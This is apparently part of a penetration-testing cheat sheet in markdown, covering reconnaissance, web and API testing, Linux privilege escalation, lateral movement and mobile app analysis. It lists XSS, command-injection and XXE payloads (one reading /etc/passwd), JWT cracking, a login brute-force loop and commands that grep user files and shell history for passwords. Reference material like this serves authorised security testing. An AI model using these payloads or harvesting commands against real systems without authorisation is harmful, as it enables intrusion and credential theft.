<!-- part 1/2 of penetration-testing.md -->

# Penetration Testing

## Reconnaissance

### Passive Information Gathering

```bash
# DNS enumeration
dig example.com ANY
nslookup -type=any example.com

# Subdomain discovery
subfinder -d example.com
amass enum -d example.com

# Certificate transparency
curl -s "https://crt.sh/?q=%.example.com&output=json"
```

### Active Scanning

```bash
# Port scanning
nmap -sV -p- target.com
nmap -sC -sV -oA scan target.com

# Web technology detection
whatweb target.com
```

## Web Application Testing

### Authentication & Authorization

```bash
# Session analysis - Check for:
# - Session timeout, Secure/HttpOnly flags
# - Session fixation, concurrent sessions

# IDOR testing
GET /api/users/123  # Your ID
GET /api/users/124  # Another user - should fail

# Privilege escalation
GET /api/admin/users  # As standard user
```

### Input Validation

```bash
# SQL injection
sqlmap -u "http://target.com/search?q=test" --batch

# XSS payloads
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Command injection
; ls -la
| whoami
$(whoami)

# XXE
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

## API Security Testing

### JWT & Token Security

```bash
# Decode JWT
echo "eyJ..." | base64 -d

# Test none algorithm
# Modify header: {"alg": "none"}

# Weak secret brute force
hashcat -m 16500 jwt.txt wordlist.txt
```

### Rate Limiting & Data Exposure

```bash
# Test rate limits
for i in {1..1000}; do
  curl https://api.target.com/login -d "user=test&pass=test"
done

# Check for excessive data exposure
GET /api/users/me
# Look for: password hashes, internal IDs, sensitive PII

# Mass assignment
POST /api/users/profile
{"email": "new@email.com", "isAdmin": true}
```

## Network Penetration

### Privilege Escalation (Linux)

```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Sudo permissions
sudo -l

# Writable paths in PATH
echo $PATH | tr ':' '\n' | xargs -I {} ls -ld {}

# Kernel exploits
uname -a
searchsploit linux kernel $(uname -r)
```

### Lateral Movement

```bash
# Network enumeration
arp -a
netstat -ant

# Service discovery
nmap -sV 192.168.1.0/24

# Credential harvesting
grep -r "password" /home/*/
cat ~/.bash_history | grep -i "pass\|pwd\|secret"
```

## Mobile Application Testing

### Android

```bash
# Decompile APK
apktool d app.apk
jadx -d output app.apk

# Check for secrets
grep -r "api_key\|secret\|password" .

# Insecure storage
adb shell
run-as com.app.package
find . -type f -exec cat {} \;
```

### iOS

```bash
# Class dump
class-dump App.app

# Check data storage
sqlite3 /var/mobile/Applications/.../Library/Caches/data.db
```

